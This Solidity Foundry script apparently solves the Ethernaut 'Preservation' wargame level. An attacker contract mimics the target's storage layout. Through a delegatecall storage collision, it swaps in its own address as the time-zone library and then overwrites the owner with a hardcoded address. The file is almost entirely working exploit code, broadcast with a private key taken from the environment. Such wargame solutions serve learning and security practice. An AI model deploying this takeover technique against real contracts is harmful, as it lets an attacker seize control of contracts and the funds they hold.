// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackerContract {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    Preservation public preservationInstance;

    constructor (address _address) {
        preservationInstance = Preservation(_address);
    }

    function setTime(uint256 _time) public {
        owner = 0x709885C74934cC931562540A863A5659eb7Cbd49;
    }

    function attack() public {
        preservationInstance.setFirstTime(uint256(uint160(address(this))));

        console.log("timeZone1Library Changed : ", preservationInstance.timeZone1Library());

        preservationInstance.setFirstTime(1);
    }
}

contract PreservationSolution is Script {
    Preservation public preservation = Preservation(0x8dc4AAa15898f3d003772A9FC111Ee54253a8965);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));
        console.log("Before owner : ", preservation.owner());
        console.log("timeZone1Library : ", preservation.timeZone1Library());
        console.log("timeZone2Library : ", preservation.timeZone2Library());

        AttackerContract attackerContract = new AttackerContract(address(preservation));

        attackerContract.attack();

        console.log("After owner : ", preservation.owner());
    }
}